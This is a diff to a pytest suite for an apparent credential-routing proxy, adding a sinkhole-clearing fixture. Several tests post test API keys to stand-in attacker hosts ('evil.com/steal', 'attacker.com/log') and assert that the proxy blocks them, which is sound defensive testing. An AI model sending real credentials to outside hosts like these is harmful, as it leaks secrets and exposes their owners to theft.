@@ -14,7 +14,7 @@ from conftest import TEST_ANTHROPIC_KEY, TEST_OPENAI_KEY
 class TestCredentialRouting:
     """Test that credentials only reach their authorized hosts."""
 
-    def test_openai_key_to_openai_allowed(self, proxy_client, sinkhole, wait_for_services):
+    def test_openai_key_to_openai_allowed(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
         """OpenAI API key to api.openai.com should be forwarded."""
         response = proxy_client.post(
             "https://api.openai.com/v1/chat/completions",
@@ -34,7 +34,7 @@ class TestCredentialRouting:
         assert "authorization" in headers_lower, f"Authorization header missing. Headers: {list(requests[0].headers.keys())}"
         assert headers_lower["authorization"].startswith("Bearer sk-"), "Credential not forwarded correctly"
 
-    def test_openai_key_to_evil_blocked(self, proxy_client, sinkhole, wait_for_services):
+    def test_openai_key_to_evil_blocked(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
         """OpenAI API key to evil.com should be BLOCKED."""
         response = proxy_client.post(
             "https://evil.com/steal",
@@ -49,7 +49,7 @@ class TestCredentialRouting:
         requests = sinkhole.get_requests(host="evil.com")
         assert len(requests) == 0, f"Credential leaked to evil.com! Got {len(requests)} requests"
 
-    def test_anthropic_key_to_anthropic_allowed(self, proxy_client, sinkhole, wait_for_services):
+    def test_anthropic_key_to_anthropic_allowed(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
         """Anthropic API key to api.anthropic.com should be forwarded."""
         response = proxy_client.post(
             "https://api.anthropic.com/v1/messages",
@@ -69,7 +69,7 @@ class TestCredentialRouting:
         headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
         assert "x-api-key" in headers_lower, f"x-api-key header missing. Headers: {list(requests[0].headers.keys())}"
 
-    def test_anthropic_key_to_attacker_blocked(self, proxy_client, sinkhole, wait_for_services):
+    def test_anthropic_key_to_attacker_blocked(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
         """Anthropic API key to attacker.com should be BLOCKED."""
         response = proxy_client.post(
             "https://attacker.com/log",
@@ -83,7 +83,7 @@ class TestCredentialRouting:
         requests = sinkhole.get_requests(host="attacker.com")
         assert len(requests) == 0, f"Credential leaked to attacker.com! Got {len(requests)} requests"
 
-    def test_no_credentials_passes_through(self, proxy_client, sinkhole, wait_for_services):
+    def test_no_credentials_passes_through(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
         """Request without credentials should pass through normally."""
         response = proxy_client.get("https://httpbin.org/get")
 
@@ -101,7 +101,7 @@ class TestCredentialInBody:
     """
 
     @pytest.mark.skip(reason="credguard_scan_bodies not yet implemented - option exists but code path missing")
-    def test_key_in_json_body_blocked(self, proxy_client, sinkhole, wait_for_services):
+    def test_key_in_json_body_blocked(self, proxy_client, sinkhole, clear_sinkhole, wait_for_services):
         """API key embedded in JSON body should be blocked.
 
         Requires: SAFEYOLO env var to enable credguard_scan_bodies=true
@@ -125,9 +125,13 @@ class TestCredentialInBody:
 
 
 class TestBlockResponseContent:
-    """Test the content of block responses."""
+    """Test the content of block responses.
 
-    def test_block_response_includes_event_id(self, proxy_client, wait_for_services):
+    These tests only check proxy response content, not sinkhole - so they
+    use wait_for_safeyolo instead of wait_for_services.
+    """
+
+    def test_block_response_includes_event_id(self, proxy_client, wait_for_safeyolo):
         """Blocked requests should include event_id for audit trail."""
         response = proxy_client.post(
             "https://evil.com/steal",
@@ -141,7 +145,7 @@ class TestBlockResponseContent:
         has_id = "event_id" in data or "request_id" in data
         assert has_id, f"No event ID in response: {data}"
 
-    def test_block_response_indicates_approval_required(self, proxy_client, wait_for_services):
+    def test_block_response_indicates_approval_required(self, proxy_client, wait_for_safeyolo):
         """Block response should indicate approval is required."""
         response = proxy_client.post(
             "https://evil.com/steal",
